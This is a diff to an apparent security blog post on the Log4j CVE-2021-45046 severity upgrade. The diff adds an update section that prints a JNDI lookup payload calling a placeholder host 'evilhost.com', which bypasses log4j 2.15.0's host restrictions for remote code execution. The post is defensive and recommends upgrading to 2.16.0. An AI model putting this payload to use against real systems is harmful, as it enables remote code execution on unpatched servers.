@@ -42,6 +42,8 @@ _The logo gets worse as the situation gets worse..._
 Earlier today, the second Log4j vulnerability (CVE-2021-45046) was upgraded from a [CVSS score of 3.7](https://web.archive.org/web/20211215180723/https://logging.apache.org/log4j/2.x/security.html)
 (limited DOS) to a [CVSS score of 9.0](https://logging.apache.org/log4j/2.x/security.html) (limited RCE).
 
+See the bottom of this post for an example exploit payload that bypasses the checks in log4j 2.15.0.
+
 **Just trying to patch Log4Shell? Please read our dedicated
 [Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).**
 
@@ -124,6 +126,16 @@ list, a full RCE is possible in the above code as we can access `attacker.com` n
 
 It is strongly recommended that you update to 2.16.0, even if you have previously updated to 2.15.0, to mitigate these
 new bypasses.
+
+## Update: The localhost Bypass was Discovered!
+
+It was [posted](https://twitter.com/marcioalm/status/1471740771581652995) on Twitter by Márcio Almeida early on
+December 17th.
+
+This payload will bypass the network host restrictions in log4j 2.15.0 and allow full RCE again:
+```
+${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
+```
 
 ## Stay Updated
 
